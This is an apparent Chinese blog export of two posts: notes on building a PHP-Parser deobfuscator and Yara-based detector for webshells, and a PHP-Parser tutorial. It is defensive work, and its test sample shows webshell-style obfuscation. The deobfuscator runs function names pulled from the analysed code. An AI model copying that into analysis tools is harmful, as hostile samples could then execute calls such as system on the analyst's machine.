一些常用的反混淆操作字符串函数直接返回值这里以base64_decode为例，后续可以把字符串操作函数放在数组里然后进行判断 12345678910111213function leavenode($node)&#123; if($node instanceof PhpParser\\Node\\Expr\\FuncCall &amp;&amp; $node-&gt;name-&gt;parts[0] == &quot;base64_decode&quot;)&#123; return new PhpParser\\Node\\Scalar\\String_($node-&gt;name-&gt;parts[0]($node-&gt;args[0]-&gt;value-&gt;value)); &#125;&#125;//例子如下&lt;?phpbase64_decode(&quot;UEhQLVBhcnNlcg&quot;);--After parser:-- &lt;?php&#x27;PHP-Parser&#x27;; 字符操作函数传递给变量然后动态调用这个目前我没有啥好的想法，我的做法是设置两个Visitor，第一个Visitor遍历到函数声明的时候把函数名和函数值存在一个static数组里，第二个Visitor为进行操作的，当遍历到$node为函数调用时，去数组里进行查询，返回对应变量的值，然后返回成String_节点 目前只写了针对单字符编码的测试，还有的函数需要多个参数，参数可能为字符也可能为变量，这里后续要考虑(初级想法是argv[]依次取出通过循环拼接命令，后续进行尝试)，还有要设计数据结构，变量可以给变量复制，是不是可以使用链表进行操作，终点指向字符串等。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253Class StrVisitor extends NodeVisitorAbstract&#123; public function __construct() &#123; $this-&gt;variable = new Variable; &#125; function leavenode($node)&#123; if($node instanceof PhpParser\\Node\\Expr\\Assign &amp;&amp; $node-&gt;var instanceof PhpParser\\Node\\Expr\\Variable &amp;&amp; $node-&gt;expr instanceof PhpParser\\Node\\Scalar\\String_) &#123; $this-&gt;variable-&gt;pushvariable($node-&gt;var-&gt;name,$node-&gt;expr-&gt;value); &#125; &#125; function afterTraverse(array $nodes) &#123; $this-&gt;variable-&gt;output(); &#125;&#125;Class FuncVisitor extends NodeVisitorAbstract&#123; public function __construct() &#123; $this-&gt;variable = new Variable; &#125; function leavenode($node)&#123; if($node instanceof PhpParser\\Node\\Expr\\FuncCall &amp;&amp; $node-&gt;name instanceof PhpParser\\Node\\Expr\\Variable) &#123; $value = $node-&gt;args[0]-&gt;value-&gt;value; $name = $this-&gt;variable-&gt;popvariable($node-&gt;name-&gt;name); if($name)&#123; return new Node\\Scalar\\String_($name($value)); &#125; &#125; &#125;&#125;Class Variable&#123; static $variablelist = []; public function pushvariable($variablename,$variablevalue)&#123; self::$variablelist[$variablename] = $variablevalue; &#125; public function popvariable($variablename)&#123; if(isset(self::$variablelist[$variablename]))&#123; return self::$variablelist[$variablename]; &#125;else&#123; return 0; &#125; &#125; public function output()&#123; var_dump(self::$variablelist); &#125;&#125; 测试如下 123456789101112131415161718192021&lt;?php$a = &#x27;base64_decode&#x27;;$b = &#x27;str_rot13&#x27;;$c = &#x27;chr&#x27;;$d = &#x27;strtolower&#x27;;$d(&#x27;@_POST&#x27;);$c(97);$b(&#x27;CUC-Cnefre&#x27;);--After parser:--&lt;?php$a = &#x27;base64_decode&#x27;;$b = &#x27;str_rot13&#x27;;$c = &#x27;chr&#x27;;$d = &#x27;strtolower&#x27;;&#x27;@_post&#x27;;&#x27;a&#x27;;&#x27;PHP-Parser&#x27;; 针对preg_replace这种多参数函数，php_deobf可以进行混淆出来，后续看一下怎么实现的这里挖个坑，每天补一点 YaraYara规则依靠于积累的规则和开源项目例如 yara_rules/gen_webshells.yar 目前的想法是将工作的重点放在反混淆上，因为如果能将反混淆做的尽量彻底，那么规则就会很好写。 两者结合做一个后端或者直接在反混淆结束之后添加 1system(&quot;yara -r webshell/rule webshell/sample&quot;); 如果有时间还是想做一个好看的后端 短期要做的事 看一下**PHPDeobfuscator**是怎么解决变量值的存储和后续替换的(目前的想法是如果遍历到遍历声明或者变量赋值，就把变量名和值传给一个数组，当后续遇到变量被调用时从数组调值进行替换，明天试试) 将Deobf当前的功能理清楚然后将目前已经可以做的补充进去 调研一下后端的建设情况","categories":[],"tags":[{"name":"PHP-Parser","slug":"PHP-Parser","permalink":"http://example.com/tags/PHP-Parser/"}]},{"title":"PHP-Parser的基本使用","slug":"PHP-Parser","date":"2022-01-28T11:45:34.000Z","updated":"2022-01-28T11:50:41.208Z","comments":true,"path":"2022/01/28/PHP-Parser/","link":"","permalink":"http://example.com/2022/01/28/PHP-Parser/","excerpt":"PHP-ParserPHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。","text":"PHP-ParserPHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。 What is PHP-ParserPHP-Parser是nikic用PHP编写的PHP5.2到PHP7.4解析器，其目的是简化静态代码分析和操作 PHP-Parser的基础使用这里先贴一下官方文档 PHP-Parser/doc at master · nikic/PHP-Parser (github.com) 最基本的是要理解其中Walking the AST的部分 初始化解析器首先创建实例 12use PhpParser\\ParserFactory;$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7); 这其中有以下参数 KindBehaviorParserFactory::PREFER_PHP7Try to parse code as PHP 7. If this fails, try to parse it as PHP 5.ParserFactory::PREFER_PHP5Try to parse code as PHP 5. If this fails, try to parse it as PHP 7.ParserFactory::ONLY_PHP7Parse code as PHP 7.ParserFactory::ONLY_PHP5Parse code as PHP 5. create还有一个参数Lexer，这里先不做讨论 在实例化之后我们就可以通过 1$stmts = $parser-&gt;parse($code); 来将代码转换成AST 为了防止抛出异常，最好在try….catch中执行 生成更加直观的AST当我们var_dump上面的$stmt时，会得到一个比较乱的AST，可以使用NodeDump将其转化为更加直观的AST 这里需要使用NodeDump 对于代码 12345&lt;?phpfunction printLine($msg) &#123; echo $msg, &quot;\\n&quot;;&#125;printLine(&#x27;Hello World!!!&#x27;); 将其转换为AST 123&lt;?phpuse PhpParser\\NodeDumper;$nodeDumper = new NodeDumper;echo $nodeDumper-&gt;dump($stmts), &quot;\\n&quot;; 得到以下输出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051array( 0: Stmt_Function( byRef: false name: Identifier( name: printLine ) params: array( 0: Param( type: null byRef: false variadic: false var: Expr_Variable( name: msg ) default: null ) ) returnType: null stmts: array( 0: Stmt_Echo( exprs: array( 0: Expr_Variable( name: msg ) 1: Scalar_String( value: ) ) ) ) ) 1: Stmt_Expression( expr: Expr_FuncCall( name: Name( parts: array( 0: printLine ) ) args: array( 0: Arg( value: Scalar_String( value: Hello World!!! ) byRef: false unpack: false ) ) ) )) Node tree structure上面我们可以看到生成了很多的Node类型 PHP是一个成熟的脚本语言，它大约有140个不同的节点。但是为了方便使用，将他们分为三类： PhpParser\\Node\\Stmts是语句节点，即不返回值且不能出现在表达式中的语言构造。例如，类定义是一个语句，它不返回值，你不能编写类似func(class {})的语句。 PhpParser\\Node\\expr是表达式节点，即返回值的语言构造，因此可以出现在其他表达式中。如：$var (PhpParser\\Node\\Expr\\Variable)和func() (PhpParser\\Node\\Expr\\FuncCall)。 PhpParser\\Node\\Scalars是表示标量值的节点，如&quot;string&quot; (PhpParser\\Node\\scalar\\string)、0 (PhpParser\\Node\\scalar\\LNumber) 或魔术常量，如”FILE“ (PhpParser\\Node\\scalar\\MagicConst\\FILE) 。所有PhpParser\\Node\\scalar都是延伸自PhpParser\\Node\\Expr，因为scalar也是表达式。 需要注意的是PhpParser\\Node\\Name和PhpParser\\Node\\Arg不在以上的节点之中 Pretty printerPrettyprinter用来将我们修改后的AST转换回PHP代码，使用如下 123456789101112131415161718192021use PhpParser\\Error;use PhpParser\\ParserFactory;use PhpParser\\PrettyPrinter;$code = &quot;&lt;?php echo &#x27;Hi &#x27;, hi\\\\getTarget();&quot;;$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\\Standard;try &#123; //生成AST $stmts = $parser-&gt;parse($code); //对节点进行操作 $stmts[0] // the echo statement -&gt;exprs // sub expressions [0] // the first of them (the string node) -&gt;value // it&#x27;s value, i.e. &#x27;Hi &#x27; = &#x27;Hello &#x27;; // change to &#x27;Hello &#x27; // pretty print $code = $prettyPrinter-&gt;prettyPrint($stmts); echo $code;&#125; catch (Error $e) &#123; echo &#x27;Parse Error: &#x27;, $e-&gt;getMessage();&#125; 在反混淆中我们一般很少使用$stmts[0]这种方式，因为我们要考虑节点的各种类型 此外还有prettyPrintExpr()，它可以用来输出一个表达式类型的节点 例如当你需要提取全局变量时 12&lt;?php $a = $_POST[&#x27;a&#x27;]; 他的语法树如下 1234567891011121314150: Stmt_Expression( expr: Expr_Assign( var: Expr_Variable( name: a ) expr: Expr_ArrayDimFetch( var: Expr_Variable( name: _POST ) dim: Scalar_String( value: a ) ) ) ) 如果我想获取$_POST[‘a’],我就需要先判断节点类型是不是Expr_ArrayDimFetch 然后判断$node-&gt;var-&gt;name是不是全局变量 最后提取$node-&gt;var-&gt;name和$node-&gt;dim-&gt;value然后将它们拼接 当我的全局变量为$_POST[a]时，dim部分的AST也会变化，我们还需要考虑这种情况。 但是我们可以使用 12345678910111213/* 用来识别全局变量; 如果要获取全局变量格式无需考虑value的节点类型 expr: Expr_ArrayDimFetch( var: Expr_Variable( name: _POST ) )*/ if ($node instanceof Node\\Expr\\ArrayDimFetch &amp;&amp; $node-&gt;var instanceof Node\\Expr\\Variable &amp;&amp; (in_array($node-&gt;var-&gt;name ,GLOBAL_VAR))) &#123; self::$globalname = $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node); &#125; 其中 1$this-&gt;prettyPrinter-&gt;prettyPrintExpr($node); 就会返回该Expr节点的表达式，无论是$_POST[&#39;a&#39;]还是$_POST[a]都可以正常返回 PHP-Parser/Pretty_printing.markdown at master · nikic/PHP-Parser (github.com) Node traversation我们使用PHP-Parser对文件的节点进行修改，最关键的就是编写节点遍历操作 使用PhpParser\\NodeTraverser我们可以遍历每一个节点，举几个简单的例子：解析php中的所有字符串，并输出 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpuse PhpParser\\Error;use PhpParser\\ParserFactory;use PhpParser\\NodeTraverser;use PhpParser\\NodeVisitorAbstract;use PhpParser\\Node;require &#x27;vendor/autoload.php&#x27;;class MyVisitor extends NodeVisitorAbstract&#123; public function leaveNode(Node $node) &#123; //判断如果是一个String_节点，就输出 if ($node instanceof Node\\Scalar\\String_) &#123; echo $node -&gt; value,&quot;\\n&quot;; &#125; &#125;&#125;$code = file_get_contents(&quot;./test.php&quot;);//实例化解释器$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$traverser = New NodeTraverser;//添加自己的Visitor$traverser-&gt;addVisitor(new MyVisitor);try &#123; //转化AST $ast = $parser-&gt;parse($code); //开始遍历 $stmts = $traverser-&gt;traverse($ast);&#125; catch (Error $error) &#123; echo &quot;Parse error: &#123;$error-&gt;getMessage()&#125;\\n&quot;; return;&#125;?&gt; 替换php脚本中函数以及类的成员方法函数名为小写 1234567891011121314class MyVisitor extends NodeVisitorAbstract&#123; public function leaveNode(Node $node) &#123; if( $node instanceof Node\\Expr\\FuncCall) &#123; $node-&gt;name-&gt;parts[0]=strtolower($node-&gt;name-&gt;parts[0]); &#125;elseif($node instanceof Node\\Stmt\\ClassMethod)&#123; $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name); &#125;elseif ($node instanceof Node\\Stmt\\Function_)&#123; $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name); &#125;elseif($node instanceof Node\\Expr\\MethodCall)&#123; $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name); &#125; &#125;&#125; 需要注意的是所有的visitors都必须实现PhpParser\\NodeVisitor接口，该接口定义了如下4个方法： 1234public function beforeTraverse(array $nodes);public function enterNode(\\PhpParser\\Node $node);public function leaveNode(\\PhpParser\\Node $node);public function afterTraverse(array $nodes); beforeTraverse方法在遍历开始之前调用一次，并将其传递给调用遍历器的节点。此方法可用于在遍历之前重置值或准备遍历树。 afterTraverse方法与beforeTraverse方法类似，唯一的区别是它只在遍历之后调用一次。 在每个节点上都调用enterNode和leaveNode方法，前者在它被输入时，即在它的子节点被遍历之前，后者在它被离开时。 这四个方法要么返回更改的节点，要么根本不返回(即null)，在这种情况下，当前节点不更改。 例子基于 AST（抽象语法树）解 PHP 混淆 | J0k3r’s Blog P.S.我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归","categories":[],"tags":[{"name":"PHP-Parser","slug":"PHP-Parser","permalink":"http://example.com/tags/PHP-Parser/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]}],"categories":[],"tags":[{"name":"Kernel","slug":"Kernel","permalink":"http://example.com/tags/Kernel/"},{"name":"面经","slug":"面经","permalink":"http://example.com/tags/%E9%9D%A2%E7%BB%8F/"},{"name":"安全开发","slug":"安全开发","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"},{"name":"源码分析","slug":"源码分析","permalink":"http://example.com/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"name":"毕业设计","slug":"毕业设计","permalink":"http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"},{"name":"PHP-Parser","slug":"PHP-Parser","permalink":"http://example.com/tags/PHP-Parser/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]}